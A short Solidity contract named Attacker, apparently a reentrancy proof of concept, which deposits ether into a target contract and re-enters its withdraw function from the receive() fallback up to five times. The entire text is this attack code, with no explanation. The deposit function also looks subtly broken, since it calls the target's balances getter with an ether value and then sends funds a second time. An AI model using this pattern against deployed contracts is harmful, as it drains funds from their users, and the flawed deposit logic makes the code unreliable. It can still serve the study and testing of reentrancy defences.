contract Attacker {
    C target;
    uint256 attackDepth;
    bool inAttack;

    constructor(address _target) {
        target = C(_target);
    }

    function deposit() external payable {
        target.balances{value: msg.value}(address(this));
        // fallback deposits to target
        (bool ok, ) = address(target).call{value: msg.value}("");
        require(ok, "deposit failed");
    }

    function triggerWithdraw() external {
        inAttack = true;
        attackDepth = 0;
        target.withdraw();
    }

    receive() external payable {
        if (inAttack && attackDepth < 5) {
            attackDepth++;
            target.withdraw();
        }
    }
}

